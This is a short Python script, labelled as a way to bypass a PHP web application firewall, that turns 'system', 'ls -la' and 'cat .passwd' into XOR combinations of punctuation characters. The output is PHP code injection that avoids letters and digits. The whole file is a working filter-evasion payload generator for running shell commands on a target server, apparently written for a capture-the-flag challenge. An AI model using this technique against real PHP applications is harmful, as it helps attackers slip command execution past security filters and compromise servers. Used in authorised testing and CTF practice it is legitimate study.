# bypass php waf without numbers letters - xor
charset = "!@#$%^&*()'\"+-,./\:;<=>?[]{}|~_"
string_code_list = ['system', 'ls -la', 'cat .passwd']
#print(charset)

for string_code in string_code_list:
    obfuscate_str_final = ""

    for i in string_code:
        is_found_obf = False
        for j in charset:
            for k in charset:
                if ord(j)^ord(k) == ord(i):
                    obfuscate_str_final += ".('%s'^'%s')" % (j,k)
                    is_found_obf = True
                if is_found_obf:
                    break
            if is_found_obf:
                break
        if not is_found_obf:
            obfuscate_str_final += ".'%s'" % i
    print("%s = %s" % (string_code, obfuscate_str_final[1:]))